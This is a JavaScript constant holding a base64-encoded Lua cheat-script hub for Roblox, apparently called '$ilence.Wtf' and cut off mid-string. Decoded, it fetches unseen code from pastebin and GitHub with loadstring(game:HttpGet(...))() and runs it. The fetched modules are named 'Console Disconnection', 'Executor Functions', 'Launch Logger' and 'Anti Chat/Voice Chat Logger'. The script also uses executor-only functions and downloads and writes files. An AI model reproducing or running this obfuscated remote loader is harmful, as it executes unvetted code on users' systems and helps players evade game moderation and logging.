const encoded = "LS1bWwokaWxlbmNlLld0ZiAyMDI1IFYxLjAuMQogICAgZGlzY29yZC5nZy9kak1RUkNOQUFaCl1dCgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tICRpbGVuY2UuV3RmIExvYWRpbmcgU2NyZWVuIE1vZHVsZSAyMDI1IC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KLS0uZ2cvZGpNUVJDTkFBWgpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2lMMEY0VVdEJykpKCkKLS1Mb2FkaW5nU2NyZWVuIE1vZHVsZQp0YXNrLndhaXQoKQoKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSAkaWxlbmNlLld0ZiBDb25zb2xlIERpc2Nvbm5lY3Rpb24gMjAyNSAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tCi0tLmdnL2RqTVFSQ05BQVoKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9ub3RteXMvTWljVXAvcmVmcy9oZWFkcy9tYWluL0Nuc2xEc25jdC5sdWEnKSkoKQotLUNvbnNvbGUgRGlzY29ubmVjdGlvbiBNb2R1bGUKdGFzay53YWl0KCkKCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJGlsZW5jZS5XdGYgRXhlY3V0b3IgRnVuY3Rpb25zIDIwMjUgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKLS0uZ2cvZGpNUVJDTkFBWgpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25vdG15cy9NaWNVcC9yZWZzL2hlYWRzL21haW4vRXhlY0Z1bmMubHVhJykpKCkKLS1FeGVjdXRvciBGdW5jdGlvbnMgTW9kdWxlCnRhc2sud2FpdCgpCgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tICRpbGVuY2UuV3RmIExhdW5jaCBMb2dnZXIgMjAyNSAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgotLS5nZy9kak1RUkNOQUFaCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbm90bXlzL01pY1VwL3JlZnMvaGVhZHMvbWFpbi9MbmNoTG9nLmx1YScpKSgpCi0tTGF1bmNoIExvZ2dlciBNb2R1bGUKdGFzay53YWl0KCkKCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJGlsZW5jZS5XdGYgQW50aSBDaGF0IExvZ2dlciAyMDI1IC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCi0tLmdnL2RqTVFSQ05BQVoKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9ub3RteXMvTWljVXAvcmVmcy9oZWFkcy9tYWluL0FudGlDaHRMb2cubHVhJykpKCkKLS1BbnRpIENoYXQgTG9nZ2VyIE1vZHVsZQp0YXNrLndhaXQoKQoKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSAkaWxlbmNlLld0ZiBBbnRpIFZvaWNlIENoYXQgTG9nZ2VyIDIwMjUgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKLS0uZ2cvZGpNUVJDTkFBWgpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25vdG15cy9NaWNVcC9yZWZzL2hlYWRzL21haW4vQW50aVZjTG9nLmx1YScpKSgpCi0tQW50aSBWb2ljZSBDaGF0IExvZ2dlciBNb2R1bGUKdGFzay53YWl0KCkKCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJGlsZW5jZS5XdGYgTm90aWZpY2F0aW9uIExpYnJhcnkgMjAyNSAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgotLS5nZy9kak1RUkNOQUFaCgpsb2NhbCBOb3RpZmljYXRpb25MaWIgPSB7fQoKbG9jYWwgVHdlZW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJUd2VlblNlcnZpY2UiKQpsb2NhbCBDb3JlR3VpID0gZ2FtZTpHZXRTZXJ2aWNlKCJDb3JlR3VpIikKCgpsb2NhbCBzY3JlZW5HdWkgPSBDb3JlR3VpOkZpbmRGaXJzdENoaWxkKCJOb3RpZmljYXRpb25VSSIpCmlmIG5vdCBzY3JlZW5HdWkgdGhlbgogICAgc2NyZWVuR3VpID0gSW5zdGFuY2UubmV3KCJTY3JlZW5HdWkiKQogICAgc2NyZWVuR3VpLk5hbWUgPSAiTm90aWZpY2F0aW9uVUkiCiAgICBzY3JlZW5HdWkuSWdub3JlR3VpSW5zZXQgPSB0cnVlCglzY3JlZW5HdWkuRGlzcGxheU9yZGVyID0gOTk5OQogICAgc2NyZWVuR3VpLlJlc2V0T25TcGF3biA9IGZhbHNlCiAgICBzY3JlZW5HdWkuWkluZGV4QmVoYXZpb3IgPSBFbnVtLlpJbmRleEJlaGF2aW9yLlNpYmxpbmcKICAgIHNjcmVlbkd1aS5QYXJlbnQgPSBDb3JlR3VpCmVuZAoKbG9jYWwgY29udGFpbmVyID0gc2NyZWVuR3VpOkZpbmRGaXJzdENoaWxkKCJOb3RpZmljYXRpb25Db250YWluZXIiKQppZiBub3QgY29udGFpbmVyIHRoZW4KICAgIGNvbnRhaW5lciA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgY29udGFpbmVyLkFuY2hvclBvaW50ID0gVmVjdG9yMi5uZXcoMSwgMSkKICAgIGNvbnRhaW5lci5Qb3NpdGlvbiA9IFVEaW0yLm5ldygxLCAtMjAsIDEsIC0yMCkKICAgIGNvbnRhaW5lci5TaXplID0gVURpbTIubmV3KDAsIDM1MCwgMSwgLTQwKQogICAgY29udGFpbmVyLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICBjb250YWluZXIuTmFtZSA9ICJOb3RpZmljYXRpb25Db250YWluZXIiCiAgICBjb250YWluZXIuUGFyZW50ID0gc2NyZWVuR3VpCgogICAgbG9jYWwgbGF5b3V0ID0gSW5zdGFuY2UubmV3KCJVSUxpc3RMYXlvdXQiKQogICAgbGF5b3V0LlNvcnRPcmRlciA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyCiAgICBsYXlvdXQuUGFkZGluZyA9IFVEaW0ubmV3KDAsIDEwKQogICAgbGF5b3V0LlZlcnRpY2FsQWxpZ25tZW50ID0gRW51bS5WZXJ0aWNhbEFsaWdubWVudC5Cb3R0b20KICAgIGxheW91dC5QYXJlbnQgPSBjb250YWluZXIKZW5kCgpsb2NhbCBub3RpZmljYXRpb25Db3VudCA9IDAKCmxvY2FsIGZ1bmN0aW9uIGZhZGVBbmRGb2xkT3V0KGluc3RhbmNlLCBkdXJhdGlvbikKICAgIGZvciBfLCBvYmogaW4gaXBhaXJzKGluc3RhbmNlOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgaWYgb2JqOklzQSgiVGV4dExhYmVsIikgb3Igb2JqOklzQSgiVGV4dEJ1dHRvbiIpIHRoZW4KICAgICAgICAgICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShvYmosIFR3ZWVuSW5mby5uZXcoZHVyYXRpb24pLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDEsIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCiAgICAgICAgZWxzZWlmIG9iajpJc0EoIkltYWdlTGFiZWwiKSBvciBvYmo6SXNBKCJJbWFnZUJ1dHRvbiIpIHRoZW4KICAgICAgICAgICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShvYmosIFR3ZWVuSW5mby5uZXcoZHVyYXRpb24pLCB7SW1hZ2VUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCiAgICAgICAgZWxzZWlmIG9iajpJc0EoIkZyYW1lIikgdGhlbgogICAgICAgICAgICBUd2VlblNlcnZpY2U6Q3JlYXRlKG9iaiwgVHdlZW5JbmZvLm5ldyhkdXJhdGlvbiksIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQogICAgICAgIGVuZAogICAgZW5kCgogICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShpbnN0YW5jZSwgVHdlZW5JbmZvLm5ldyhkdXJhdGlvbiksIHsKICAgICAgICBTaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDApLAogICAgfSk6UGxheSgpCgogICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShpbnN0YW5jZSwgVHdlZW5JbmZvLm5ldyhkdXJhdGlvbiksIHsKICAgICAgICBQb3NpdGlvbiA9IGluc3RhbmNlLlBvc2l0aW9uICsgVURpbTIubmV3KDAsIDAsIDAsIC0xMCksCiAgICB9KTpQbGF5KCkKZW5kCgpmdW5jdGlvbiBOb3RpZmljYXRpb25MaWIuTm90aWZ5KG9wdGlvbnMpCiAgICBsb2NhbCBUaXRsZSA9IG9wdGlvbnMuVGl0bGUgb3IgIk5vdGlmaWNhdGlvbiIKICAgIGxvY2FsIENvbnRlbnQgPSBvcHRpb25zLkNvbnRlbnQgb3IgIiIKICAgIGxvY2FsIER1cmF0aW9uID0gb3B0aW9ucy5EdXJhdGlvbiBvciA1CgogICAgbG9jYWwgU2hvd0J1dHRvbjEgPSBvcHRpb25zLkJ1dHRvbjEgb3IgZmFsc2UKICAgIGxvY2FsIEJ1dHRvbjFUZXh0ID0gb3B0aW9ucy5CdXR0b24xVGV4dCBvciAiT0siCiAgICBsb2NhbCBCdXR0b24xQ2FsbGJhY2sgPSBvcHRpb25zLkJ1dHRvbjFDYWxsYmFjayBvciBmdW5jdGlvbigpIGVuZAoKICAgIGxvY2FsIFNob3dCdXR0b24yID0gb3B0aW9ucy5CdXR0b24yIG9yIGZhbHNlCiAgICBsb2NhbCBCdXR0b24yVGV4dCA9IG9wdGlvbnMuQnV0dG9uMlRleHQgb3IgIkNhbmNlbCIKICAgIGxvY2FsIEJ1dHRvbjJDYWxsYmFjayA9IG9wdGlvbnMuQnV0dG9uMkNhbGxiYWNrIG9yIGZ1bmN0aW9uKCkgZW5kCgogICAgbG9jYWwgaGFzQnV0dG9ucyA9IFNob3dCdXR0b24xIG9yIFNob3dCdXR0b24yCiAgICBsb2NhbCBmdWxsSGVpZ2h0ID0gaGFzQnV0dG9ucyBhbmQgMTMwIG9yIDkwCgogICAgCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBTb3VuZFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlNvdW5kU2VydmljZSIpCiAgICAgICAgbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCgogICAgICAgIGxvY2FsIGludHJvVXJsID0gImh0dHBzOi8vZ2l0aHViLmNvbS9ub3RteXMvbWFpbi9yYXcvcmVmcy9oZWFkcy9tYWluL2ludHJvL25vdGlmaWNhdGlvbi5tcDMiCiAgICAgICAgbG9jYWwgaW50cm9Gb2xkZXIgPSAibm90aV9teXMiCiAgICAgICAgbG9jYWwgaW50cm9GaWxlTmFtZSA9ICJub3RpZmljYXRpb24ubXAzIgogICAgICAgIGxvY2FsIGludHJvRmlsZVBhdGggPSBpbnRyb0ZvbGRlciAuLiAiLyIgLi4gaW50cm9GaWxlTmFtZQoKICAgICAgICBsb2NhbCBmdW5jdGlvbiBmaWxlRXhpc3RzKHBhdGgpCiAgICAgICAgICAgIHJldHVybiBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICByZWFkZmlsZShwYXRoKQogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIGZ1bmN0aW9uIGVuc3VyZUZvbGRlcigpCiAgICAgICAgICAgIGlmIG5vdCBpc2ZvbGRlcihpbnRyb0ZvbGRlcikgdGhlbgogICAgICAgICAgICAgICAgbWFrZWZvbGRlcihpbnRyb0ZvbGRlcikKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIGZ1bmN0aW9uIGZldGNoQW5kU2F2ZUludHJvKCkKICAgICAgICAgICAgZW5zdXJlRm9sZGVyKCkKICAgICAgICAgICAgbG9jYWwgc3VjY2VzcywgZGF0YSA9IHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHJldHVybiBnYW1lOkh0dHBHZXQoaW50cm9VcmwpCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIGlmIHN1Y2Nlc3MgYW5kIGRhdGEgdGhlbgogICAgICAgICAgICAgICAgd3JpdGVmaWxlKGludHJvRmlsZVBhdGgsIGRhdGEpCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB3YXJuKCJGYWlsZWQgdG8gZmV0Y2ggaW50cm8gYXVkaW86ICIgLi4gKGRhdGEgb3IgIlVua25vd24gZXJyb3IiKSkKICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKCiAgICAgICAgaWYgbm90IGZpbGVFeGlzdHMoaW50cm9GaWxlUGF0aCkgdGhlbgogICAgICAgICAgICBsb2NhbCBvayA9IGZldGNoQW5kU2F2ZUludHJvKCkKICAgICAgICAgICAgaWYgbm90IG9rIHRoZW4gcmV0dXJuIGVuZAogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBzdWNjZXNzLCBhc3NldFBhdGggPSBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgIHJldHVybiBnZXRjdXN0b21hc3NldChpbnRyb0ZpbGVQYXRoKQogICAgICAgIGVuZCkKCiAgICAgICAgaWYgbm90IHN1Y2Nlc3MgdGhlbgogICAgICAgICAgICB3YXJuKCJGYWlsZWQgdG8gY3JlYXRlIGN1c3RvbSBhc3NldCBmcm9tIHBhdGg6ICIgLi4gaW50cm9GaWxlUGF0aCkKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIHNvdW5kID0gSW5zdGFuY2UubmV3KCJTb3VuZCIpCiAgICAgICAgc291bmQuU291bmRJZCA9IGFzc2V0UGF0aAogICAgICAgIHNvdW5kLlZvbHVtZSA9IDAuMQogICAgICAgIHNvdW5kLk5hbWUgPSAiTm90aWZpY2F0aW9uU291bmQiCgogICAgICAgIGxvY2FsIHBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICBsb2NhbCBwbGF5ZXJHdWkgPSBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoIlBsYXllckd1aSIpCiAgICAgICAgaWYgbm90IHBsYXllckd1aSB0aGVuIHJldHVybiBlbmQKCiAgICAgICAgbG9jYWwgZ3VpID0gcGxheWVyR3VpOkZpbmRGaXJzdENoaWxkKCJOb3RpZmljYXRpb25Tb3VuZEd1aSIpCiAgICAgICAgaWYgbm90IGd1aSB0aGVuCiAgICAgICAgICAgIGd1aSA9IEluc3RhbmNlLm5ldygiU2NyZWVuR3VpIikKICAgICAgICAgICAgZ3VpLk5hbWUgPSAiTm90aWZpY2F0aW9uU291bmRHdWkiCiAgICAgICAgICAgIGd1aS5SZXNldE9uU3Bhd24gPSBmYWxzZQogICAgICAgICAgICBndWkuUGFyZW50ID0gcGxheWVyR3VpCiAgICAgICAgZW5kCgogICAgICAgIHNvdW5kLlBhcmVudCA9IGd1aQoKICAgICAgICBsb2NhbCBvaywgZXJyID0gcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICBTb3VuZFNlcnZpY2U6UGxheUxvY2FsU291bmQoc291bmQpCiAgICAgICAgZW5kKQoKICAgICAgICBpZiBub3Qgb2sgdGhlbgogICAgICAgICAgICB3YXJuKCJTb3VuZCBwbGF5YmFjayBlcnJvcjogIiAuLiBlcnIpCiAgICAgICAgZW5kCgogICAgICAgIHNvdW5kLkVuZGVkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBzb3VuZDpEZXN0cm95KCkKICAgICAgICBlbmQpCiAgICBlbmQpCgogICAgbm90aWZpY2F0aW9uQ291bnQgPSBub3RpZmljYXRpb25Db3VudCArIDEKCiAgICBsb2NhbCBub3RpZiA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgbm90aWYuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAwKQogICAgbm90aWYuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApCiAgICBub3RpZi5Cb3JkZXJTaXplUGl4ZWwgPSAwCiAgICBub3RpZi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMC40CiAgICBub3RpZi5DbGlwc0Rlc2NlbmRhbnRzID0gdHJ1ZQogICAgbm90aWYuTGF5b3V0T3JkZXIgPSAtbm90aWZpY2F0aW9uQ291bnQKICAgIG5vdGlmLkFuY2hvclBvaW50ID0gVmVjdG9yMi5uZXcoMCwgMSkKICAgIG5vdGlmLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDAsIDEsIDApCiAgICBub3RpZi5QYXJlbnQgPSBjb250YWluZXIKICAgIEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBub3RpZikuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgNikKCiAgICBsb2NhbCB0aXRsZSA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKICAgIHRpdGxlLlNpemUgPSBVRGltMi5uZXcoMSwgLTIwLCAwLCAyMCkKICAgIHRpdGxlLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDEwLCAwLCAxMCkKICAgIHRpdGxlLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICB0aXRsZS5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgIHRpdGxlLlRleHQgPSBUaXRsZQogICAgdGl0bGUuVGV4dENvbG9yMyA9IENvbG9yMy5uZXcoMSwgMSwgMSkKICAgIHRpdGxlLlRleHRTaXplID0gMTYKICAgIHRpdGxlLlRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0CiAgICB0aXRsZS5UZXh0VHJhbnNwYXJlbmN5ID0gMQogICAgdGl0bGUuUGFyZW50ID0gbm90aWYKCiAgICBsb2NhbCBjb250ZW50ID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgY29udGVudC5TaXplID0gVURpbTIubmV3KDEsIC0yMCwgMCwgNDApCiAgICBjb250ZW50LlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDEwLCAwLCAzNSkKICAgIGNvbnRlbnQuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgIGNvbnRlbnQuRm9udCA9IEVudW0uRm9udC5Hb3RoYW0KICAgIGNvbnRlbnQuVGV4dCA9IENvbnRlbnQKICAgIGNvbnRlbnQuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwMCwgMjAwLCAyMDApCiAgICBjb250ZW50LlRleHRTaXplID0gMTQKICAgIGNvbnRlbnQuVGV4dFdyYXBwZWQgPSB0cnVlCiAgICBjb250ZW50LlRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0CiAgICBjb250ZW50LlRleHRZQWxpZ25tZW50ID0gRW51bS5UZXh0WUFsaWdubWVudC5Ub3AKICAgIGNvbnRlbnQuVGV4dFRyYW5zcGFyZW5jeSA9IDEKICAgIGNvbnRlbnQuUGFyZW50ID0gbm90aWYKCiAgICBpZiBoYXNCdXR0b25zIHRoZW4KICAgICAgICBsb2NhbCBidXR0b25GcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgICAgIGJ1dHRvbkZyYW1lLlNpemUgPSBVRGltMi5uZXcoMSwgLTIwLCAwLCAzMCkKICAgICAgICBidXR0b25GcmFtZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAxMCwgMSwgLTQwKQogICAgICAgIGJ1dHRvbkZyYW1lLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKQogICAgICAgIGJ1dHRvbkZyYW1lLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgYnV0dG9uRnJhbWUuUGFyZW50ID0gbm90aWYKCiAgICAgICAgbG9jYWwgYnV0dG9uTGF5b3V0ID0gSW5zdGFuY2UubmV3KCJVSUxpc3RMYXlvdXQiKQogICAgICAgIGJ1dHRvbkxheW91dC5GaWxsRGlyZWN0aW9uID0gRW51bS5GaWxsRGlyZWN0aW9uLkhvcml6b250YWwKICAgICAgICBidXR0b25MYXlvdXQuU29ydE9yZGVyID0gRW51bS5Tb3J0T3JkZXIuTGF5b3V0T3JkZXIKICAgICAgICBidXR0b25MYXlvdXQuUGFkZGluZyA9IFVEaW0ubmV3KDAsIDEwKQogICAgICAgIGJ1dHRvbkxheW91dC5Ib3Jpem9udGFsQWxpZ25tZW50ID0gRW51bS5Ib3Jpem9udGFsQWxpZ25tZW50LlJpZ2h0CiAgICAgICAgYnV0dG9uTGF5b3V0LlBhcmVudCA9IGJ1dHRvbkZyYW1lCgogICAgICAgIGlmIFNob3dCdXR0b24yIHRoZW4KICAgICAgICAgICAgbG9jYWwgYnV0dG9uMiA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgICAgIGJ1dHRvbjIuU2l6ZSA9IFVEaW0yLm5ldygwLCAxMDAsIDEsIDApCiAgICAgICAgICAgIGJ1dHRvbjIuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDE4MCwgNTAsIDUwKQogICAgICAgICAgICBidXR0b24yLlRleHQgPSBCdXR0b24yVGV4dAogICAgICAgICAgICBidXR0b24yLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtTWVkaXVtCiAgICAgICAgICAgIGJ1dHRvbjIuVGV4dENvbG9yMyA9IENvbG9yMy5uZXcoMSwgMSwgMSkKICAgICAgICAgICAgYnV0dG9uMi5UZXh0U2l6ZSA9IDE0CiAgICAgICAgICAgIGJ1dHRvbjIuQXV0b0J1dHRvbkNvbG9yID0gZmFsc2UKICAgICAgICAgICAgYnV0dG9uMi5UZXh0VHJhbnNwYXJlbmN5ID0gMQogICAgICAgICAgICBidXR0b24yLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwCiAgICAgICAgICAgIGJ1dHRvbjIuUGFyZW50ID0gYnV0dG9uRnJhbWUKCiAgICAgICAgICAgIEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBidXR0b24yKS5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA2KQoKICAgICAgICAgICAgYnV0dG9uMi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIEJ1dHRvbjJDYWxsYmFjaygpCiAgICAgICAgICAgICAgICBmYWRlQW5kRm9sZE91dChub3RpZiwgMC4zKQogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMzUpCiAgICAgICAgICAgICAgICBub3RpZjpEZXN0cm95KCkKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAoKICAgICAgICBpZiBTaG93QnV0dG9uMSB0aGVuCiAgICAgICAgICAgIGxvY2FsIGJ1dHRvbjEgPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQogICAgICAgICAgICBidXR0b24xLlNpemUgPSBVRGltMi5uZXcoMCwgMTAwLCAxLCAwKQogICAgICAgICAgICBidXR0b24xLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQig2MCwgMTIwLCAyNTUpCiAgICAgICAgICAgIGJ1dHRvbjEuVGV4dCA9IEJ1dHRvbjFUZXh0CiAgICAgICAgICAgIGJ1dHRvbjEuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1NZWRpdW0KICAgICAgICAgICAgYnV0dG9uMS5UZXh0Q29sb3IzID0gQ29sb3IzLm5ldygxLCAxLCAxKQogICAgICAgICAgICBidXR0b24xLlRleHRTaXplID0gMTQKICAgICAgICAgICAgYnV0dG9uMS5BdXRvQnV0dG9uQ29sb3IgPSBmYWxzZQogICAgICAgICAgICBidXR0b24xLlRleHRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgIGJ1dHRvbjEuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAKICAgICAgICAgICAgYnV0dG9uMS5QYXJlbnQgPSBidXR0b25GcmFtZQoKICAgICAgICAgICAgSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIGJ1dHRvbjEpLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDYpCgogICAgICAgICAgICBidXR0b24xLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgQnV0dG9uMUNhbGxiYWNrKCkKICAgICAgICAgICAgICAgIGZhZGVBbmRGb2xkT3V0KG5vdGlmLCAwLjMpCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4zNSkKICAgICAgICAgICAgICAgIG5vdGlmOkRlc3Ryb3koKQogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICB0YXNrLndhaXQoKQogICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShub3RpZiwgVHdlZW5JbmZvLm5ldygwLjQsIEVudW0uRWFzaW5nU3R5bGUuUXVpbnQpLCB7CiAgICAgICAgU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCBmdWxsSGVpZ2h0KSwKICAgIH0pOlBsYXkoKQoKICAgIGZvciBfLCBvYmogaW4gaXBhaXJzKG5vdGlmOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgaWYgb2JqOklzQSgiVGV4dExhYmVsIikgdGhlbgogICAgICAgICAgICBUd2VlblNlcnZpY2U6Q3JlYXRlKG9iaiwgVHdlZW5JbmZvLm5ldygwLjQpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKICAgICAgICBlbHNlaWYgb2JqOklzQSgiVGV4dEJ1dHRvbiIpIHRoZW4KICAgICAgICAgICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShvYmosIFR3ZWVuSW5mby5uZXcoMC40KSwge1RleHRUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBpZiBub3QgaGFzQnV0dG9ucyB0aGVuCiAgICAgICAgdGFzay5kZWxheShEdXJhdGlvbiwgZnVuY3Rpb24oKQogICAgICAgICAgICBpZiBub3RpZiBhbmQgbm90aWYuUGFyZW50IHRoZW4KICAgICAgICAgICAgICAgIGZhZGVBbmRGb2xkT3V0KG5vdGlmLCAwLjMpCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4zNSkKICAgICAgICAgICAgICAgIG5vdGlmOkRlc3Ryb3koKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKZW5kCgpfRy5Ob3RpZmljYXRpb25MaWIgPSBOb3RpZmljYXRpb25MaWIKCnRhc2sud2FpdCgpCgotLS5nZy9kak1RUkNOQUFaCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbm90bXlzL01pY1VwL3JlZnMvaGVhZHMvbWFpbi9jaGF0bXNnLmx1YScpKSgpCi0tTG9hZGVyIE1lc3NhZ2UgTW9kdWxlCnRhc2sud2FpdCgpCgotLVtbIApNYWRlIEJ5ICRpbGVuY2UKLmdnL2RqTVFSQ05BQVoKXV0KCmxvY2FsIGZ1bmN0aW9uIFNpbGVuY2VXVEZ0YWdzKCkKICAgIGxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQogICAgbG9jYWwgVHdlZW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJUd2VlblNlcnZpY2UiKQogICAgbG9jYWwgQ29yZUd1aSA9IGdhbWU6R2V0U2VydmljZSgiQ29yZUd1aSIpCgogICAgbG9jYWwgTG9jYWxQbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCiAgICBsb2NhbCBzaG93T3duVGFnID0gdHJ1ZQoKICAgIGxvY2FsIFRhZ1BhcmVudCA9IChnZXRodWkgYW5kIGdldGh1aSgpKQogICAgICAgIG9yIChnZXRfaGlkZGVuX2d1aSBhbmQgZ2V0X2hpZGRlbl9ndWkoKSkKICAgICAgICBvciAoZ2V0X2hpZGRlbl91aSBhbmQgZ2V0X2hpZGRlbl91aSgpKQogICAgICAgIG9yIENvcmVHdWkKCiAgICBsb2NhbCBmdW5jdGlvbiBtb2RpZnlTdHJpbmcoc3RyKQogICAgICAgIHJldHVybiAoc3RyOmdzdWIoIiAiLCAiIikpCiAgICBlbmQKCiAgICBsb2NhbCBkZWZhdWx0V2hpdGVsaXN0TWVzc2FnZXMgPSB7CiAgICAgICAgIiRpbGVuY2UuV3RmIE9uIFRvcCgpIiwKICAgICAgICAiJGlsZW5jZS5XdGYgUHJlbWl1bSBPbiBUb3AoKSIKICAgIH0KCiAgICBsb2NhbCBXaGl0ZWxpc3RNZXNzYWdlcyA9IHt9CiAgICBsb2NhbCBX